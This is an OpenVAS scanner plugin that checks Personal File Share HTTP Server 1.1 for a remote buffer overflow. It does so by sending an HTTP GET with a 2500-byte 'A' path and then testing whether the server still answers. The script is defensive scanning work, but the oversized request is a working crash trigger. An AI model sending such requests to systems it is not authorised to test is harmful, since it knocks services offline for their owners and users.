###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_personal_file_share_http_server_bof_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Personal File Share HTTP Server Remote Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let remote unauthenticated attackers to
  cause a denial of service.
  Impact Level: Application";

tag_affected = "Personal File Share HTTP Server version 1.1 and prior";
tag_insight = "The flaw is due to an error when handling certain Long requests, which
  can be exploited to cause a denial of service.";
tag_solution = "No solution or patch is available as of 02nd, May 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.srplab.com/";
tag_summary = "This host is running Personal File Share HTTP Server and is prone to buffer
  overflow vulnerability.";

if(description)
{
  script_id(803196);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-05-02 13:34:27 +0530 (Thu, 02 May 2013)");
  script_name("Personal File Share HTTP Server Remote Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Apr/184");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/526480");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/personal-file-share-http-server-remote-overflow");
  script_description(desc);
  script_summary("Check Personal File Share HTTP Server is vulnerable by sending crafted packets");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

req = "";
res = "";
port = "";

## Get HTTP Port
port = get_http_port(default:8080);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);

## ## Confirm the application before trying exploit
if(">Files From" >!< res && ">Web File Explore<" >!< res &&
   ">srplab.cn" >!< res){
  exit(0);
}

## Send crafted data to server
req = http_get(item:crap(data:"A", length:2500), port:port);
res = http_keepalive_send_recv(port:port, data:req);

req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Check the server response after exploit
if(">Files From" >!< res && ">Web File Explore<" >!< res
                                 && ">srplab.cn" >!< res)
{
  security_warning(port);
  exit(0);
}
